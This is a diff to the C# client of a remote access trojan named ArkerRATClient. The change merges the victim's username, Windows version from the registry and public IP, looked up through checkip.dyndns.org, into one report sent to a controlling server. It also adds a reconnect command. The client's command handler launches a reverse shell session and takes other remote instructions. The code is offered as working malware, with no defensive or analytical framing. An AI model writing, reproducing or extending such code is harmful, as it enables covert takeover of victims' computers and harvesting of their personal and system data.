@@ -32,15 +32,10 @@ namespace ArkerRATClient
             try
             {
                 tcpClient = new TcpClient(ip, port);
-                tcpClient.NoDelay = false;
                 serverStream = tcpClient.GetStream();
                 serverStream.ReadTimeout = 20000;
                 noConnection = false;
-                SendIp();
-                Thread.Sleep(700);
-                SendUserName();
-                Thread.Sleep(700);
-                SendOSVersion();
+                SendClientInfo();
                 await ReadData();
             }
             catch(Exception ex)
@@ -66,13 +61,9 @@ namespace ArkerRATClient
                 CloseConnection();
             }
         }
-        private static async void SendIp()
+        private static string SendIp()
         {
             try
-            {
-
-            }
-            catch(Exception ex)
             {
                 string address = "";
                 WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
@@ -85,7 +76,11 @@ namespace ArkerRATClient
                 int first = address.IndexOf("Address: ") + 9;
                 int last = address.LastIndexOf("</body>");
                 address = address.Substring(first, last - first);
-                await SendData("§IP§" + address);
+                return address;
+            }
+            catch(Exception ex)
+            {
+                return "";
             }
           
         }
@@ -107,8 +102,6 @@ namespace ArkerRATClient
         public static bool uninstallFix = false;
         private static async Task DecideCyberTool(string data)
         {
-
-
             if (data.Contains("§ReverseShell§"))
             {
                 ReverseShell.reverseCMDSession(data.Replace("§ReverseShell§", ""));
@@ -151,11 +144,11 @@ namespace ArkerRATClient
                 CloseConnection();
                 Environment.Exit(0);
             }
-        }
 
-        private static async void SendUserName()
-        {
-            await SendData(Environment.UserName+"§UserName§");
+            if (data.Contains("§Reconnect§"))
+            {
+                CloseConnection();
+            }
         }
 
         public static void CloseConnection()
@@ -169,14 +162,13 @@ namespace ArkerRATClient
             {
                 noConnection = true;
             }
-
             noConnection = true;
         }
 
-        public static async void SendOSVersion()
+        public static async void SendClientInfo()
         {
              string HKLM_GetString(string path, string key)
-            {
+             {
                 try
                 {
                     RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
@@ -184,10 +176,10 @@ namespace ArkerRATClient
                     return (string)rk.GetValue(key);
                 }
                 catch { return ""; }
-            }
+             }
 
              string FriendlyName()
-            {
+             {
                 string ProductName = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
                 string CSDVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CSDVersion");
                 if (ProductName != "")
@@ -196,9 +188,8 @@ namespace ArkerRATClient
                                 (CSDVersion != "" ? " " + CSDVersion : "");
                 }
                 return "";
-            }
-
-            await SendData(FriendlyName()+"§OSVersion§");
-       }
+             }
+            await SendData(Environment.UserName + "                      " + FriendlyName() + "                      " +SendIp()+"§ClientInfo§");
+        }
     }
 }
